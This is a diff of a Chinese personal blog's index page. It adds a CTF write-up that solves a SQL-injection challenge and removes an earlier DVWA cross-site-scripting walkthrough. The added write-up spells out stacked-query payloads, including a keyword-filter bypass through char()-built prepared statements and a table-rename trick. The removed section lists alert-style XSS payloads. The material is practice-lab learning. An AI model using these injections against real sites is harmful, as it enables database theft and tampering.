@@ -148,6 +148,122 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-buu1-随便注" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/unln1999.github.io/2019/10/19/buu1-随便注/">BUU 2019/10/19 随便注</a>
+    </h1>
+  
+
+        
+        <a href="/unln1999.github.io/2019/10/19/buu1-随便注/" class="archive-article-date">
+  	<time datetime="2019-10-18T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="进入题目页面"><a href="#进入题目页面" class="headerlink" title="进入题目页面"></a>进入题目页面</h2><p>有一个输入框和按钮，html代码里说sqlmap是没有灵魂的，因此手动注入。</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>常规思路，有绕过尝试绕过，无法绕过可以重命名。</p>
+<h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>1.<br>输入 1<br>返回</p>
+<p>2.<br>输入’<br>报错，为字符型注入。</p>
+<p>3.<br>输入’ or 1#</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;miaomiaomiao&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(6) &quot;114514&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(2) &quot;ys&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一个输入1 第二个输入2</p>
+<p>4.输入’ union select 1,2#<br>提示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
+
+<p>5.尝试堆查询 ‘;show databases;#和’;show tables;#<br>猜测自己是在“using ctftraining（数据库）”</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(11) &quot;ctftraining&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;information_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;mysql&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;performance_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(9) &quot;supersqli&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>‘;show tables from ctftraining;#<br>得到<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(10) &quot;FLAG_TABLE&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;news&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;users&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>原来自己不在那个库里……<br>而是在supersqli。</p>
+<ol start="7">
+<li><p>‘;show columns from <code>1919810931114514</code>;#</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>预处理绕过 ‘;set @sisi=concat(char(115,101,108,101,99,116),” * from <code>1919810931114514</code>“);prepare sqla from @sisi;execute sqla;#<br>返回</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>改一下大小写<br>‘;Set @sisi=concat(char(115,101,108,101,99,116),” * from <code>1919810931114514</code>“);Prepare sqla from @sisi;execute sqla;#<br>得到flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(42) &quot;flag&#123;86da5891-38c3-4689-8068-5fbb553e6ed8&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="9">
+<li>重命名法<br>‘;show columns from <code>1919810931114514</code>;#<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  </span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  </span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>只有flag一个column<br>‘;alter table <code>1919810931114514</code> change flag id varchar(100);# 【一定要加变量类型】<br>‘;rename table words to word,<code>1919810931114514</code> to words;#<br>‘ or 1;#<br>得到flag。</p>
+<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ol>
+<li><strong>concat拼接</strong></li>
+<li><strong>SQL预处理</strong></li>
+</ol>
+<p>‘;SET @sql=concat(char(115,101,108,101,99,116),” * from <code>1919810931114514</code>“);PREPARE sqla from @sql;EXECUTE sqla;#<br>‘;set @sisi=concat(char(115,101,108,101,99,116),” * from <code>1919810931114514</code>“);prepare sqla from @sisi;execute sqla;#</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">buuctf</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/unln1999.github.io/2019/10/19/buu1-随便注/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-计网实验一" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -566,14 +682,23 @@
 <p>PHP也是用mysqli_query(connection,query)<br>查询语句按以下结构：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;CREATE TABLE runoob_tbl( &quot;.</span><br><span class="line">        &quot;runoob_id INT NOT NULL AUTO_INCREMENT, &quot;.</span><br><span class="line">        &quot;runoob_title VARCHAR(100) NOT NULL, &quot;.</span><br><span class="line">        &quot;runoob_author VARCHAR(40) NOT NULL, &quot;.</span><br><span class="line">        &quot;submission_date DATE, &quot;.</span><br><span class="line">        &quot;PRIMARY KEY ( runoob_id ))ENGINE=InnoDB DEFAULT CHARSET=utf8; &quot;;</span><br></pre></td></tr></table></figure>
 
-<h1 id="删除数据库-1"><a href="#删除数据库-1" class="headerlink" title="删除数据库"></a>删除数据库</h1><p>drop table table_name</p>
+<h1 id="删除数据表"><a href="#删除数据表" class="headerlink" title="删除数据表"></a>删除数据表</h1><p>drop table table_name</p>
 <p>PHP也是用mysqli_query(connection,query)</p>
-<h1 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h1><p>insert into table_name (column1,column2,column3) values (value1,value2,value3);<br>接下来我不看上面的创建数据表的sql语句：</p>
+<h1 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h1><p>insert into table_name (column1,column2,column3) values (value1,value2,value3);<br>接下来我不看上面的创建数据表的sql语句，写一下php sql命令：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;insert into example1&quot;.</span><br><span class="line">&quot;(column1,column2,column3)&quot;.</span><br><span class="line">&quot;values&quot;.</span><br><span class="line">&quot;(value1,value2,value3);&quot;</span><br></pre></td></tr></table></figure>
 
 <p><font color="red">思考了一下，其实不用分行</font></p>
 <h1 id="查询语言（怪重要的）"><a href="#查询语言（怪重要的）" class="headerlink" title="查询语言（怪重要的）"></a>查询语言（怪重要的）</h1><p>select     column1,column2 from table_name [where clause] [limut N,n] [offset M]</p>
-<p>limit 设置了返回的记录数，可以一定程度上增加SQL注入的难度。有两个参数时，第一个跳过数量，第二个取一定数量。有一个参数时为要取的数量。<br>offset 是查询的数据偏移量，默认为0，类似于两参数limit的第一个参数。</p>
+<p>limit 设置了返回的记录数，可以一定程度上增加SQL注入的难度。有两个参数时，第一个跳过数量，第二个取一定数量。有一个参数时为要取的数量。<br>offset 是查询的数据偏移量，默认为0，类似于两参数limit的第一个参数。<br>补充：</p>
+<ul>
+<li>实际上也可以使用多个表，用逗号分隔。</li>
+<li>可以用*代替字段。</li>
+</ul>
+<p>PHP实现：<br>用mysqli_query(connection,query)来获取数据，用mysqli_fetch_array()输出数据。</p>
+<p>查询结束后可用:<br>mysqli_free_result()释放。</p>
+<p>where子句不展开介绍。</p>
+<h1 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h1><p>update table_name set field1=new-value1,field2=new-value2;</p>
+<h1 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h1><p>delete from table_name [where clause] </p>
 
       
 
@@ -995,114 +1120,6 @@
 
 
   
-    <article id="post-DVWAXSS" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/unln1999.github.io/2019/10/07/DVWAXSS/">DVWA-XSS全解</a>
-    </h1>
-  
-
-        
-        <a href="/unln1999.github.io/2019/10/07/DVWAXSS/" class="archive-article-date">
-  	<time datetime="2019-10-06T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-07</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><p>DOM Based XSS：是基于DOM文档对象模型的操作，通过前端脚本修改页面的DOM节点形成的XSS，该操作不与服务器端进行交互，而且代码是可见的，从前端获取到DOM中的数据在本地执行，从效果上来说也是反射型XSS。<br>说白了就是在HTML里攻击。</p>
-<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>选择一个语言提交后，url里会出现以get方式提交的default，<br>令default=&lt;script&gt;alert(“xss”)&lt;/script&gt;<br>攻击成功。</p>
-<p>html里的这块代码和High级是一样的，目的是美化选项下拉框。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">					if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) &#123;</span><br><span class="line">						var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);</span><br><span class="line">						document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;);</span><br><span class="line">						document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;);</span><br><span class="line">					&#125;</span><br><span class="line">					    </span><br><span class="line">					document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);</span><br><span class="line">				&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>php代码里屏蔽了script（不分大小写）。<br>利用img标签。<br>闭合&lt;option&gt;和&lt;select&gt;标签，是代码在value里也可以运行。<br>令default=&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(“xss”)&gt;<br>攻击成功。</p>
-<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>html源码里有一段：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">					if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) &#123;  //document.location.href是url地址，判断是否存在这个语句。</span><br><span class="line">						var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);//利用substring方法从defaut=后开始读取lang</span><br><span class="line">						document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;);//decodeURI解码统一资源标记符</span><br><span class="line">						document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;);//画一个选不了的---</span><br><span class="line">					&#125;</span><br><span class="line">					    </span><br><span class="line">					document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);</span><br><span class="line">				&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>其实不是很重要。</p>
-<p>这里对default的限制是在服务器的php脚本中检查的，所以只要用#不把内容传给服务器就可以了。<br>令default=English#&lt;script&gt;alert(“xss”)&lt;/script&gt;<br>或default=English#&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(“xss”)&gt;<br>攻击成功。</p>
-<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">					if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) &#123;</span><br><span class="line">						var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);</span><br><span class="line">						document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + (lang) + &quot;&lt;/option&gt;&quot;);//不解码了，正常的选项不需要解码</span><br><span class="line">						document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;);</span><br><span class="line">					&#125;</span><br><span class="line">					    </span><br><span class="line">					document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);</span><br><span class="line">				&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h1 id="Reflected"><a href="#Reflected" class="headerlink" title="Reflected"></a>Reflected</h1><h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><p>输入&lt;script&gt;alert(“xss”)&lt;/script&gt;<br>攻击成功。<br>这是依靠php来写html元素。</p>
-<h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><p>把小写的script替换为””了。<br>输入&lt;Script&gt;alert(“xss”)&lt;/sCript&gt;<br>html标签无视大小写。<br>攻击成功。</p>
-<h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><p>它用正则表达式处理script标签，<br>那我们就不管它了，通过img标签攻击。<br>输入&lt;img src=1 onerror=alert(“xss”)&gt;<br>攻击成功。前两题也可以用这个。</p>
-<h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><p>看一下代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// Is there any input? </span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123; </span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line">    $name = htmlspecialchars( $_GET[ &apos;name&apos; ] ); </span><br><span class="line"></span><br><span class="line">    // Feedback for end user </span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line">generateSessionToken();</span><br></pre></td></tr></table></figure>
-
-<p>主要是用了htmlspecialchars函数，<br>效果是：<br><img src="/img/xss-1.png" alt="xss-1"><br>相当于把输入变成了&amp;ltimg src=1 onerror=alert(“xss”)&amp;gt,变成了纯粹的文本。</p>
-<h1 id="Stored"><a href="#Stored" class="headerlink" title="Stored"></a>Stored</h1><h2 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2><p>也是通过php来写html元素。<br>源码是：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); //trim也可以用来获取输入</span><br><span class="line">    $name    = trim( $_POST[ &apos;txtName&apos; ] ); </span><br><span class="line"></span><br><span class="line">    // Sanitize message input 去除输入框内容</span><br><span class="line">    $message = stripslashes( $message );  //删除斜杠</span><br><span class="line">    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); </span><br><span class="line"></span><br><span class="line">    // Sanitize name input 去除输入框内容</span><br><span class="line">    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); </span><br><span class="line"></span><br><span class="line">    // Update database </span><br><span class="line">    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; //这个是更新数据库</span><br><span class="line">    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); </span><br><span class="line"></span><br><span class="line">    //mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>随便输个名字<br>message里填&lt;script&gt;alert(“xss”)&lt;/script&gt;<br>之所以可以攻击是因为斜杠被URI编码，这里的过滤无效。<br><img src="/img/xss-2.png" alt="xss-2"><br><img src="/img/xss-3.png" alt="xss-3"><br>无论是name还是message都很好攻击。<br>攻击成功。</p>
-<h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); </span><br><span class="line">    $name    = trim( $_POST[ &apos;txtName&apos; ] ); </span><br><span class="line"></span><br><span class="line">    // Sanitize message input </span><br><span class="line">    $message = strip_tags( addslashes( $message ) ); </span><br><span class="line">    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); </span><br><span class="line">    $message = htmlspecialchars( $message ); </span><br><span class="line"></span><br><span class="line">    // Sanitize name input </span><br><span class="line">    $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name ); </span><br><span class="line">    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); </span><br><span class="line"></span><br><span class="line">    // Update database </span><br><span class="line">    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; </span><br><span class="line">    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); </span><br><span class="line"></span><br><span class="line">    //mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>可见name字段比较薄弱，用bp绕过前端限制攻击。<br>攻击成功。</p>
